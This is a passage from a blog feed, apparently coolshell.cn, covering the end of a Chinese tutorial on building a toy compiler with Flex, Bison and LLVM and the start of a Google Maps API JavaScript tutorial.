    const NIdentifier&amp; type;
    NIdentifier&amp; id;
    NExpression *assignmentExpr;
    NVariableDeclaration(const NIdentifier&amp; type, NIdentifier&amp; id) :
        type(type), id(id) { }
    NVariableDeclaration(const NIdentifier&amp; type, NIdentifier&amp; id, NExpression *assignmentExpr) :
        type(type), id(id), assignmentExpr(assignmentExpr) { }
    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
};

class NFunctionDeclaration : public NStatement {
public:
    const NIdentifier&amp; type;
    const NIdentifier&amp; id;
    VariableList arguments;
    NBlock&amp; block;
    NFunctionDeclaration(const NIdentifier&amp; type, const NIdentifier&amp; id,
            const VariableList&amp; arguments, NBlock&amp; block) :
        type(type), id(id), arguments(arguments), block(block) { }
    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
};

</pre>
<br>
非常的清晰明了，我们省略了getter和setter方法，这里只列出了共有成员；这些类也不需要影藏私有数据，并省略了codeGen方法。在我们导出AST成LLVM的字节码时，就需要使用到这个方法。
<p></p>
<h3>4.2、Bison介绍</h3>

<p>bison的语法定义文件同样是由这些标记构成的最复杂的部分。这并不是说技术上有多复杂，但是我也会花一些时间来讨论一下Bison的语法细节，好，现在让我们立刻来熟悉一下Bison的语法。我们将使用基于类似于BNF的语法，使用定义的好终结符和非终结符来组成我们有效的每一个语句和表达式(这些语句和表达式就代表我们之前定义的AST节点)。例如：</p>
<pre>if_stmt : IF '(' condition ')' block { /* do stuff when this rule is encountered */ }
        | IF '(' condition ')'       { ... }
        ;
</pre>
<p>在上面例子中，我们定义了一个if语句(如果我们支持if语句话)，它和BNF不同之处在于，每个语法后面都跟了一系列动作(在'{‘和’}’之间的内容)。这个动作将在此条语法被识别(译者注：归约)的时候被执行。这个过程将会递归地按从叶子符号到根节点符号的次序执行，在这个过程，每一个非终结符最终会被合并为一棵大的语法树。你将会看到的’$$’符号代表着当前树的跟节点(译者注：’$$’代表本条语法规则中冒号左边的部分的语义内容)。此外’$1’代表了本条规则叶子中的第一个符号(译者注：’$1’代表了本条语法规则冒号右边的内容，$1代表冒号右边的第一个符号的语义值)。在上面的例子中，当’condition’有效时我们将会把$3 赋值给$$。这个例子可以解释如何将我们AST和语法规则关联起来。我们将在每一条规则中通常赋值一个节点到$$，最后这些规则会合并成一个大的抽象语法树。Bison的部分是我们语言最复杂的部分，你需要花一点时间去理解它。此外到此为止，你还没有看到完整的代码。下面就是完整的Bison部分的代码：<br>
parser.y</p>
<pre>%{
    #include "node.h"
    NBlock *programBlock; /* the top level root node of our final AST */

    extern int yylex();
    void yyerror(const char *s) { printf("ERROR: %s\n", s); }
%}

/* Represents the many different ways we can access our data */
%union {
    Node *node;
    NBlock *block;
    NExpression *expr;
    NStatement *stmt;
    NIdentifier *ident;
    NVariableDeclaration *var_decl;
    std::vector<nvariabledeclaration> *varvec;
    std::vector<nexpression> *exprvec;
    std::string *string;
    int token;
}

/* Define our terminal symbols (tokens). This should
   match our tokens.l lex file. We also define the node type
   they represent.
 */
%token <string> TIDENTIFIER TINTEGER TDOUBLE
%token <token> TCEQ TCNE TCLT TCLE TCGT TCGE TEQUAL
%token <token> TLPAREN TRPAREN TLBRACE TRBRACE TCOMMA TDOT
%token <token> TPLUS TMINUS TMUL TDIV

/* Define the type of node our nonterminal symbols represent.
   The types refer to the %union declaration above. Ex: when
   we call an ident (defined by union type ident) we are really
   calling an (NIdentifier*). It makes the compiler happy.
 */
%type <ident> ident
%type <expr> numeric expr
%type <varvec> func_decl_args
%type <exprvec> call_args
%type <block> program stmts block
%type <stmt> stmt var_decl func_decl
%type <token> comparison

/* Operator precedence for mathematical operators */
%left TPLUS TMINUS
%left TMUL TDIV

%start program

%%

program : stmts { programBlock = $1; }
        ;

stmts : stmt { $$ = new NBlock(); $$-&gt;statements.push_back($<stmt>1); }
      | stmts stmt { $1-&gt;statements.push_back($<stmt>2); }
      ;

stmt : var_decl | func_decl
     | expr { $$ = new NExpressionStatement(*$1); }
     ;

block : TLBRACE stmts TRBRACE { $$ = $2; }
      | TLBRACE TRBRACE { $$ = new NBlock(); }
      ;

var_decl : ident ident { $$ = new NVariableDeclaration(*$1, *$2); }
         | ident ident TEQUAL expr { $$ = new NVariableDeclaration(*$1, *$2, $4); }
         ;

func_decl : ident ident TLPAREN func_decl_args TRPAREN block
            { $$ = new NFunctionDeclaration(*$1, *$2, *$4, *$6); delete $4; }
          ;

func_decl_args : /*blank*/  { $$ = new VariableList(); }
          | var_decl { $$ = new VariableList(); $$-&gt;push_back($<var_decl>1); }
          | func_decl_args TCOMMA var_decl { $1-&gt;push_back($<var_decl>3); }
          ;

ident : TIDENTIFIER { $$ = new NIdentifier(*$1); delete $1; }
      ;

numeric : TINTEGER { $$ = new NInteger(atol($1-&gt;c_str())); delete $1; }
        | TDOUBLE { $$ = new NDouble(atof($1-&gt;c_str())); delete $1; }
        ;

expr : ident TEQUAL expr { $$ = new NAssignment(*$<ident>1, *$3); }
     | ident TLPAREN call_args TRPAREN { $$ = new NMethodCall(*$1, *$3); delete $3; }
     | ident { $<ident>$ = $1; }
     | numeric
     | expr comparison expr { $$ = new NBinaryOperator(*$1, $2, *$3); }
     | TLPAREN expr TRPAREN { $$ = $2; }
     ;

call_args : /*blank*/  { $$ = new ExpressionList(); }
          | expr { $$ = new ExpressionList(); $$-&gt;push_back($1); }
          | call_args TCOMMA expr  { $1-&gt;push_back($3); }
          ;

comparison : TCEQ | TCNE | TCLT | TCLE | TCGT | TCGE
           | TPLUS | TMINUS | TMUL | TDIV
           ;

%%
</ident></ident></var_decl></var_decl></stmt></stmt></token></stmt></block></exprvec></varvec></expr></ident></token></token></token></string></nexpression></nvariabledeclaration></pre>
<p></p>
<h2>5、生成Flex和Bison代码</h2>

<p>现在我们有了Flex的token.l文件和Bison的parser.y文件。我们需要将这两个文件传递给工具，并由工具来生成c++代码文件。注意Bison同时会为Flex生成parser.hpp头文件；这样做是通过-d开关实现的，这个开关是的我们的标记声明和源文件分开，这样就是的我们可以让这些token标记被其他的程序使用。下面的命令创建parser.cpp，parser.hpp和tokens.cpp源文件。</p>
<pre>$ bison -d -o parser.cpp parser.y
$ lex -o tokens.cpp tokens.l
</pre>
<p>如果上述工作都没有出错的话，我们现在位置已经完成了我们编译器工作总量的2/3。如果你现在想测试一下我们的代码，你可以编译一个简单的main.cpp程序：<br>
</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;iostream&gt;
#include "node.h"
extern NBlock* programBlock;
extern int yyparse();

int main(int argc, char **argv)
{
    yyparse();
    std::cout &lt;&lt; programBlock &lt;&lt; endl;
    return 0;
}
</pre>
<p>你可以编译这些文件：<br>
$ g++ -o parser parser.cpp tokens.cpp main.cpp<br>
现在你需要安装LLVM了，因为llvm::Value被node.h引用了。如果你不想这么做，只是想测试一下Flex和Bison部分，你可以注释掉node.h中codeGen()方法。</p>
<p>如果上述工作都完成了，你现在将有一个语法分析器，这个语法分析器将从标准输入读入，并打出在内存中代表抽象语法树跟节点的内存非零地址。</p>
<h2>6、组装AST和LLVM</h2>
<p>编译器的下一步很自然地是应该将AST转换成机器码。这意味着将每一个语义节点转换成等价的机器指令。LLVM将帮助我们把这步变得非常简单，因为LLVM将真实的指令抽象成类似AST的指令。这意味着我们真正要做的事就是将AST转换成抽象指令。<br>
你可以想象这个过程是从抽象语法树的根节点开始遍历每一个树上节点并产生字节码的过程。现在就是使用我们在Node中定义的codeGen方法的时候了。例如，当我们遍历NBlock代码的时候(语义上NBlock代表一组我们语言的语句的集合)，我们将调用列表中每条语句的codeGen方法。上面步骤代码类似如下的形式：<br>
</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">Value* NBlock::codeGen(CodeGenContext&amp; context)
{
    StatementList::const_iterator it;
    Value *last = NULL;
    for (it = statements.begin(); it != statements.end(); it++) {
        std::cout &lt;&lt; "Generating code for " &lt;&lt; typeid(**it).name() &lt;&lt; endl;
        last = (**it).codeGen(context);
    }
    std::cout &lt;&lt; "Creating block" &lt;&lt; endl;
    return last;
}
</pre>
<br>
我们将实现抽象语法树上所有节点的codeGen方法，然后在向下遍历树的时候调用它，并隐式的遍历我们整个抽象语法树。在这个过程中，我们在CodeGenContext类来告诉我们生成字节码的位置。
<p></p>
<h3> 6.1、关于LLVM要注意的一些信息</h3>

<p>LLVM最大的一个确定就是，你很难找到LLVM的相关文档。在线手册、教程、或其他的文档都没有及时的得到相关维护，这些文档大部分都是过期的文档。除非你去深入研究，否则你很难找到关于C++ API的信息。如果你自己安装LLVM，docs<br>
是最新的文档。</p>
<p>我发现最好学习LLVM的方法就是通过LLVM的例子去学习。在LLVM的压缩包的’example’目录下有很多快速生成字节码的例子。在<a href="https://llvm.org/demo/">LLVM demo site</a>上可以将C做输入，然后生成C++ API的例子。以这些例子提供的方法，我找到了类似于int x = 5 ;的指令的生成方法。我使用这些工具实现大部分的节点。</p>
<p>关于LLVM的问题描述到此为止，我将在下面罗列出codegen.h和codegen.cpp的源代码</p>
<p>codegen.h的内容。<br>
</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stack&gt;
#include &lt;llvm/Module.h&gt;
#include &lt;llvm/Function.h&gt;
#include &lt;llvm/PassManager.h&gt;
#include &lt;llvm/CallingConv.h&gt;
#include &lt;llvm/Bitcode/ReaderWriter.h&gt;
#include &lt;llvm/Analysis/Verifier.h&gt;
#include &lt;llvm/Assembly/PrintModulePass.h&gt;
#include &lt;llvm/Support/IRBuilder.h&gt;
#include &lt;llvm/ModuleProvider.h&gt;
#include &lt;llvm/ExecutionEngine/GenericValue.h&gt;
#include &lt;llvm/ExecutionEngine/JIT.h&gt;
#include &lt;llvm/Support/raw_ostream.h&gt;

using namespace llvm;

class NBlock;

class CodeGenBlock {
public:
    BasicBlock *block;
    std::map&lt;std::string , Value*&gt; locals;
};

class CodeGenContext {
    std::stack&lt;codegenblock  *&gt; blocks;
    Function *mainFunction;

public:
    Module *module;
    CodeGenContext() { module = new Module("main"); }

    void generateCode(NBlock&amp; root);
    GenericValue runCode();
    std::map&lt;std::string , Value*&gt;&amp; locals() { return blocks.top()-&gt;locals; }
    BasicBlock *currentBlock() { return blocks.top()-&gt;block; }
    void pushBlock(BasicBlock *block) { blocks.push(new CodeGenBlock()); blocks.top()-&gt;block = block; }
    void popBlock() { CodeGenBlock *top = blocks.top(); blocks.pop(); delete top; }
};
</pre>
<p>codegen.cpp的内容。<br>
</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include "node.h"
#include "codegen.h"
#include "parser.hpp"

using namespace std;

/* Compile the AST into a module */
void CodeGenContext::generateCode(NBlock&amp; root)
{
    std::cout &lt;&lt; "Generating code...\n";

    /* Create the top level interpreter function to call as entry */
    vector&lt;const type*&gt; argTypes;
    FunctionType *ftype = FunctionType::get(Type::VoidTy, argTypes, false);
    mainFunction = Function::Create(ftype, GlobalValue::InternalLinkage, "main", module);
    BasicBlock *bblock = BasicBlock::Create("entry", mainFunction, 0);

    /* Push a new variable/block context */
    pushBlock(bblock);
    root.codeGen(*this); /* emit bytecode for the toplevel block */
    ReturnInst::Create(bblock);
    popBlock();

    /* Print the bytecode in a human-readable format
       to see if our program compiled properly
     */
    std::cout &lt;&lt; "Code is generated.\n";
    PassManager pm;
    pm.add(createPrintModulePass(&amp;outs()));
    pm.run(*module);
}

/* Executes the AST by running the main function */
GenericValue CodeGenContext::runCode() {
    std::cout &lt;&lt; "Running code...\n";
    ExistingModuleProvider *mp = new ExistingModuleProvider(module);
    ExecutionEngine *ee = ExecutionEngine::create(mp, false);
    vector&lt;genericvalue&gt; noargs;
    GenericValue v = ee-&gt;runFunction(mainFunction, noargs);
    std::cout &lt;&lt; "Code was run.\n";
    return v;
}

/* Returns an LLVM type based on the identifier */
static const Type *typeOf(const NIdentifier&amp; type)
{
    if (type.name.compare("int") == 0) {
        return Type::Int64Ty;
    }
    else if (type.name.compare("double") == 0) {
        return Type::FP128Ty;
    }
    return Type::VoidTy;
}

/* -- Code Generation -- */

Value* NInteger::codeGen(CodeGenContext&amp; context)
{
    std::cout &lt;&lt; "Creating integer: " &lt;&lt; value &lt;&lt; endl;
    return ConstantInt::get(Type::Int64Ty, value, true);
}

Value* NDouble::codeGen(CodeGenContext&amp; context)
{
    std::cout &lt;&lt; "Creating double: " &lt;&lt; value &lt;&lt; endl;
    return ConstantFP::get(Type::FP128Ty, value);
}

Value* NIdentifier::codeGen(CodeGenContext&amp; context)
{
    std::cout &lt;&lt; "Creating identifier reference: " &lt;&lt; name &lt;&lt; endl;
    if (context.locals().find(name) == context.locals().end()) {
        std::cerr &lt;&lt; "undeclared variable " &lt;&lt; name &lt;&lt; endl;
        return NULL;
    }
    return new LoadInst(context.locals()[name], "", false, context.currentBlock());
}

Value* NMethodCall::codeGen(CodeGenContext&amp; context)
{
    Function *function = context.module-&gt;getFunction(id.name.c_str());
    if (function == NULL) {
        std::cerr &lt;&lt; "no such function " &lt;&lt; id.name &lt;&lt; endl;
    }
    std::vector&lt;value *&gt; args;
    ExpressionList::const_iterator it;
    for (it = arguments.begin(); it != arguments.end(); it++) {
        args.push_back((**it).codeGen(context));
    }
    CallInst *call = CallInst::Create(function, args.begin(), args.end(), "", context.currentBlock());
    std::cout &lt;&lt; "Creating method call: " &lt;&lt; id.name &lt;&lt; endl;
    return call;
}

Value* NBinaryOperator::codeGen(CodeGenContext&amp; context)
{
    std::cout &lt;&lt; "Creating binary operation " &lt;&lt; op &lt;&lt; endl;
    Instruction::BinaryOps instr;
    switch (op) {
        case TPLUS:     instr = Instruction::Add; goto math;
        case TMINUS:    instr = Instruction::Sub; goto math;
        case TMUL:      instr = Instruction::Mul; goto math;
        case TDIV:      instr = Instruction::SDiv; goto math;

        /* TODO comparison */
    }

    return NULL;
math:
    return BinaryOperator::Create(instr, lhs.codeGen(context),
        rhs.codeGen(context), "", context.currentBlock());
}

Value* NAssignment::codeGen(CodeGenContext&amp; context)
{
    std::cout &lt;&lt; "Creating assignment for " &lt;&lt; lhs.name &lt;&lt; endl;
    if (context.locals().find(lhs.name) == context.locals().end()) {
        std::cerr &lt;&lt; "undeclared variable " &lt;&lt; lhs.name &lt;&lt; endl;
        return NULL;
    }
    return new StoreInst(rhs.codeGen(context), context.locals()[lhs.name], false, context.currentBlock());
}

Value* NBlock::codeGen(CodeGenContext&amp; context)
{
    StatementList::const_iterator it;
    Value *last = NULL;
    for (it = statements.begin(); it != statements.end(); it++) {
        std::cout &lt;&lt; "Generating code for " &lt;&lt; typeid(**it).name() &lt;&lt; endl;
        last = (**it).codeGen(context);
    }
    std::cout &lt;&lt; "Creating block" &lt;&lt; endl;
    return last;
}

Value* NExpressionStatement::codeGen(CodeGenContext&amp; context)
{
    std::cout &lt;&lt; "Generating code for " &lt;&lt; typeid(expression).name() &lt;&lt; endl;
    return expression.codeGen(context);
}

Value* NVariableDeclaration::codeGen(CodeGenContext&amp; context)
{
    std::cout &lt;&lt; "Creating variable declaration " &lt;&lt; type.name &lt;&lt; " " &lt;&lt; id.name &lt;&lt; endl;
    AllocaInst *alloc = new AllocaInst(typeOf(type), id.name.c_str(), context.currentBlock());
    context.locals()[id.name] = alloc;
    if (assignmentExpr != NULL) {
        NAssignment assn(id, *assignmentExpr);
        assn.codeGen(context);
    }
    return alloc;
}

Value* NFunctionDeclaration::codeGen(CodeGenContext&amp; context)
{
    vector&lt;const type*&gt; argTypes;
    VariableList::const_iterator it;
    for (it = arguments.begin(); it != arguments.end(); it++) {
        argTypes.push_back(typeOf((**it).type));
    }
    FunctionType *ftype = FunctionType::get(typeOf(type), argTypes, false);
    Function *function = Function::Create(ftype, GlobalValue::InternalLinkage, id.name.c_str(), context.module);
    BasicBlock *bblock = BasicBlock::Create("entry", function, 0);

    context.pushBlock(bblock);

    for (it = arguments.begin(); it != arguments.end(); it++) {
        (**it).codeGen(context);
    }

    block.codeGen(context);
    ReturnInst::Create(bblock);

    context.popBlock();
    std::cout &lt;&lt; "Creating function: " &lt;&lt; id.name &lt;&lt; endl;
    return function;
}
</pre>
<p>上述罗列很多的代码，然而这部份代码的含义需要你自己去探索。我在这里只会提及一下你需要注意的内容：</p>
<ul>
<li>我们在CodeGenContext类中使用一个语句块的栈来保存最后进入的block(因为语句都被增加到blocks中)
</li>
<li>我们同样用个堆栈来保存每组语句块中的<a href="https://en.wikipedia.org/wiki/Symbol_table">符号表</a> </li>
<li>我们设计的语言只会知道他当前范围内的内容.要支持“全局”上下的做法，你必须向上搜索整个堆栈中每一个语句块，知道你最后发现你匹配的符号(现在我们只是简单地搜索堆栈中最顶层的符号表)。 </li>
<li>在我们进入一个语句块之前，我们需要将语句块压栈，离开语句块时将语句块出栈 </li>
</ul>
<p>剩下的内容都LLVM相关了，在这个主题上我并不是专家。但是迄今为止，我们已经有了编译和运行我们语言的所有代码。</p>
<p></p>
<h2>7、编译和运行我们的语言</h2>

<p></p>
<h3>7.1、编译我们的语言</h3>

<p>我们已经有了代码，现在我们怎么运行它？LLVM有着非常复杂的联接link，幸运的是，如果你是自己安装的LLVM，那么你就应该有一个llvm-config二进制程序，这个程序返回你需要的所有编译和联接选项。<br>
我们也要同时更新我们的main.cpp的内容使之可以编译和运行我们的代码，这次我们main.cpp的内容如下：<br>
</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;iostream&gt;
#include "codegen.h"
#include "node.h"

using namespace std;

extern int yyparse();
extern NBlock* programBlock;

int main(int argc, char **argv)
{
    yyparse();
    std::cout &lt;&lt; programBlock &lt;&lt; endl;

    CodeGenContext context;
    context.generateCode(*programBlock);
    context.runCode();

    return 0;
}
</pre>
<br>
现在我们需要这样来编译这些代码<br>
$ g++ -o parser `llvm-config –libs core jit native –cxxflags –ldflags` *.cpp<br>
你也可以编写一个Makefile来进行编译
<pre>all: parser

clean:
	rm parser.cpp parser.hpp parser tokens.cpp

parser.cpp: parser.y
	bison -d -o <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f8dcb8">[email protected]</a> $^

parser.hpp: parser.cpp

tokens.cpp: tokens.l parser.hpp
	lex -o <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="486c08">[email protected]</a> $^

parser: parser.cpp codegen.cpp main.cpp tokens.cpp
	g++ -o <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="80a4c0">[email protected]</a> `llvm-config --libs core jit native --cxxflags --ldflags` *.cpp
</pre>
<p></p>
<h3>7.2、运行我们的语言</h3>

<p>假设上述所有工作都圆满完成，那么现在你将有一个名为parser的二进制程序。运行它，还记得我们那个典型例子吗？让我们看看我们的编译器工作的如何。</p>
<pre>$ echo 'int do_math(int a) { int x = a * 5 + 3 } do_math(10)' | ./parser
0x100a00f10
Generating code...
Generating code for 20NFunctionDeclaration
Creating variable declaration int a
Generating code for 20NVariableDeclaration
Creating variable declaration int x
Creating assignment for x
Creating binary operation 276
Creating binary operation 274
Creating integer: 3
Creating integer: 5
Creating identifier reference: a
Creating block
Creating function: do_math
Generating code for 20NExpressionStatement
Generating code for 11NMethodCall
Creating integer: 10
Creating method call: do_math
Creating block
Code is generated.
; ModuleID = 'main'

define internal void @main() {
entry:
	%0 = call i64 @do_math(i64 10)		;  [#uses=0]
	ret void
}

define internal i64 @do_math(i64) {
entry:
	%a = alloca i64		;  [#uses=1]
	%x = alloca i64		;  [#uses=1]
	%1 = add i64 5, 3	;  [#uses=1]
	%2 = load i64* %a	;  [#uses=1]
	%3 = mul i64 %2, %1	;  [#uses=1]
	store i64 %3, i64* %x
	ret void
}
Running code...
Code was run.
</pre>
<p></p>
<h2>8、结论</h2>

<p>是不是非常的酷？我同意如果你只是从这篇文章中拷贝粘贴的话，你可能会对运行得到的结果感觉有点失望，但是这点结果可能也会激发你更大的兴趣。此外，这就是本文的意义，这不是本篇指导文章的结束，这只是一个开始。因为有了这篇文章的介绍，你可以在文法分析，语法分析和装配语言的时候附加上一些疯狂的特性，然后创造出一个你自己命名的语言。你现在已经可以编译语句块了，那么你现在应该已经有如何继续下去的基本想法。<br>
本文完整的代码在Github<a href="https://github.com/lsegal/my_toy_compiler">这里</a>。我一直都在避免提到这个代码，因为这个代码不是本文的重点，而仅仅是带过这部分代码。</p>
<p>我意识到这是一篇非常长的文章，并且这篇文章中难免会有出错的地方，如果你找到了任何问题，在你觉得有空的时候，欢迎你给我发电子邮件，我将会调整我的文章。你如果向想我们共享一些信息，你也可以在你觉得有空的时候写信给我们。</p>
<p></p>
 ]]></content>
<pubDate>2009-10-12T12:47:18+08:00</pubDate>
<guid>https://coolshell.cn/articles/1547.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Google Maps API用法教程 ]]></title>
<link>https://coolshell.cn/articles/1561.html</link>
<content><![CDATA[ 
<p>在过去的一年中，在线地图的发展是相当巨大，我们可以看到在线地图的极有价值的信息和其能力。这其中，最有名气的自然是Google Maps。. Google Maps由一个相当强大的开发引擎并也有一个很大的社区提示支持。</p>
<p>Google 允许各种web masters 通过Google Maps API来增加或自定义他们站点特定的地图，你可能从这里取得<a title="Get a Google Maps API Key" href="https://code.google.com/intl/en/apis/maps/signup.html" target="_blank">Google API key </a>。一个地图 API key只对一个“目录”或域有效。key绑定了你的域名，你要在网站上放地图，需要有对应的key，否则拒绝读取地图数据，在本地测试可以不用key。当然，你可以申请多个API key。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%9C%B0%E5%9B%BE" title="创建一个简单的地图">创建一个简单的地图</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%9C%B0%E5%9B%BE%E6%A0%87%E8%AE%B0" title="地图标记">地图标记</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E6%B4%BB%E5%8A%A8%E6%A0%87%E8%AE%B0" title="活动标记">活动标记</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%8A%A0%E5%85%A5%E5%A4%9A%E4%B8%AA%E6%A0%87%E8%AE%B0%E5%B9%B6%E5%88%86%E7%BB%84" title="加入多个标记并分组">加入多个标记并分组</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E8%BF%87%E6%BB%A4%E6%98%BE%E7%A4%BA%E6%A0%87%E8%AE%B0" title="过滤显示标记">过滤显示标记</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%9C%B0%E5%9B%BE"></span>创建一个简单的地图<span class="ez-toc-section-end"></span>
</h4>
<p>在你的站点上引入Google Maps 是一件很简单的事情，你只需要加入：</p>
<p><span id="more-1561"></span></p>
<ul>
<li>引入Google的JavaScript 文件</li>
<li>设置JavaScript 一些参数</li>
<li>一个你需要显示地图的HTML layer</li>
</ul>
<p><strong>Google的Javascript文件引入</strong>:</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">&lt;script
    charset="UTF-8"
    src=http://maps.google.com/maps?file=api&amp;v=2&amp;hl=en&amp;oe=utf-8&amp;key=API_KEY
    type="text/javascript"&gt;
&lt;/script&gt;
</pre>
<p><em><strong>注意</strong>：</em> 我们可以改变语言，比如说，把“<strong>hl=en</strong>” 改成中文“<strong>hl=zh-CN</strong>” 。我们还得要把“<strong>API_KEY</strong>” 改成我们向Google申请来的那个。</p>
<p><strong>说明</strong>: 使用 UTF-8 编码会更好些。</p>
<p><strong>设置地图参数</strong>:</p>
<p>这是你可定制有个性化的Google Maps的地方。我们可以增加一些参数来改变地图的样式。例如，我们可以设置地图的载入和显示的坐标。下面是相关的代码：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">]function initialize() {
    if (GBrowserIsCompatible()) {
        var map = new GMap2(document.getElementById("map_canvas"));
        map.setCenter(new GLatLng(37.97918, 23.71665), 13);
        map.setUIToDefault();
    }
}</pre>
<p>请注意上面高亮的那一条语句，第一个是纬度坐标和第二个是经度坐标，“13” 表示地图缩放的程度，这个值可以取1 到17。</p>
<p>要知道所在地点的纬度和经度，你可以使用<a title="Tool to get the coordinates of a location" href="http://www.satsig.net/maps/lat-long-finder.htm" target="_blank">这个工具</a>，这个工具很容易使用，只需要把地图移到你想要的区域，然后，把鼠标放在中心就可以了。</p>
<h4>
<span class="ez-toc-section" id="%E5%9C%B0%E5%9B%BE%E6%A0%87%E8%AE%B0"></span>地图标记<span class="ez-toc-section-end"></span>
</h4>
<p>你可以在地图上放上一个标记来标出一个特定的位置，下面是一个示例代码。</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var point = new GLatLng(37.97110, 23.72601);
map.addOverlay(new GMarker(point));</pre>
<p>于是，我们整个代码看起来是下面这个样子：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function initialize() {
    if (GBrowserIsCompatible()) {
        var map = new GMap2(document.getElementById("map_canvas"));
        map.setCenter(new GLatLng(37.97918, 23.71665), 13);
        var point = new GLatLng(37.97110, 23.72601);
        map.addOverlay(new GMarker(point));
        map.setUIToDefault();
    }
}</pre>
<p>上面的示例把我们的地图的中心放在了希腊雅典，标记了雅典卫城。</p>
<p><strong>气球提示</strong></p>
<p>气球提示一个很不错的界面，他可以用于放置一些小提示或或是一些信息。例如，下面的代码将放置一个在雅典卫城山上放一个气球提示来显示一些信息：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function initialize() {
    if (GBrowserIsCompatible()) {
        var map = new GMap2(document.getElementById("map_canvas"));
        map.setCenter(new GLatLng(37.97110, 23.72601), 13);
        var html = "Parthenon 帕台农神庙, 地址: Acropolis Hill";
        map.openInfoWindow(map.getCenter(),
        document.createTextNode(html));
        map.setUIToDefault();
    }
}</pre>
<h4>
<span class="ez-toc-section" id="%E6%B4%BB%E5%8A%A8%E6%A0%87%E8%AE%B0"></span>活动标记<span class="ez-toc-section-end"></span>
</h4>
<p>我们可以合并一些标记和气球提示来创建一个活动标记，这样一来，我们可以达到这样的效果——当用户点击某个标记的时候才会显示提示。代码如下所示：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function initialize() {
    if (GBrowserIsCompatible()) {
        var map = new GMap2(document.getElementById("map_canvas"));
        map.setCenter(new GLatLng(37.97918, 23.71665), 13);
        var baseIcon = new GIcon(G_DEFAULT_ICON);
        baseIcon.shadow = "http://www.google.com/mapfiles/shadow50.png";
        baseIcon.iconSize = new GSize(20, 34);
        baseIcon.shadowSize = new GSize(37, 34);
        baseIcon.iconAnchor = new GPoint(9, 34);
        baseIcon.infoWindowAnchor = new GPoint(9, 2);

        function createMarker(point, index) {
            var redIcon = new GIcon(baseIcon);
            redIcon.image = "http://www.google.com/mapfiles/marker.png";
            markerOptions = { icon:redIcon };
            var marker = new GMarker(point, markerOptions);
            GEvent.addListener(marker, "click", function() {
                marker.openInfoWindowHtml("Parthenon, Address: Acropolis Hill");
            });
            return marker;
        }

        var latlng = new GLatLng(37.97110, 23.72601);
        map.addOverlay(createMarker(latlng));
    }
}</pre>
<p>让我来梳理一下上面的代码。下面的部分是在标记下增加一个阴影：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var baseIcon = new GIcon(G_DEFAULT_ICON);
baseIcon.shadow = "http://www.google.com/mapfiles/shadow50.png";
baseIcon.iconSize = new GSize(20, 34);
baseIcon.shadowSize = new GSize(37, 34);
baseIcon.iconAnchor = new GPoint(9, 34);
baseIcon.infoWindowAnchor = new GPoint(9, 2);</pre>
<p>标记的Action是在这里设置的：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function createMarker(point, index) {
    var redIcon = new GIcon(baseIcon);
    redIcon.image = "http://www.google.com/mapfiles/marker.png";
    markerOptions = { icon:redIcon };
    var marker = new GMarker(point, markerOptions);
    GEvent.addListener(marker, "click", function() {
        marker.openInfoWindowHtml("Parthenon, Address: Acropolis Hill");
    });
    return marker;
}</pre>
<p>这里是我们的标记的坐标：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var latlng = new GLatLng(37.97110, 23.72601);
map.addOverlay(createMarker(latlng));</pre>
<h3>载入地图</h3>
<p>我们可以通过两种方法载入地图。我们可以让地图在整网页载入时载入（通过使用body的load事件），也可以把载入过程赋给其它事件。下面的两个方法是我们需要注意的：</p>
<ul>
<li>
<strong>initialize()</strong> 载入地图</li>
<li>
<strong>GUnload()</strong> 卸载地图以释放内存</li>
</ul>
<p>我们当然还需要使用HTML的DIV标签来指定一个ID，这样才能被JavaScript使用，在我们的示例中，我们使用“map_canvas”。我们也能使用CSS来渲染这个DIV层。</p>
<h3>定制地图</h3>
<p>你可以使用自定义的标记和阴影。有两个工具可以帮助你创建这些图标—— <a title="Custom Marker Icons" href="https://gmaps-utility-library.googlecode.com/svn/trunk/mapiconmaker/1.1/examples/markericonoptions-wizard.html" target="_blank">地图标记</a> 和<a title="Custom Shadows for Maps" href="http://www.cycloloco.com/shadowmaker/" target="_blank"> 阴影</a>。你也可以使用HTML和CSS来定义气球提示。</p>
<h4>
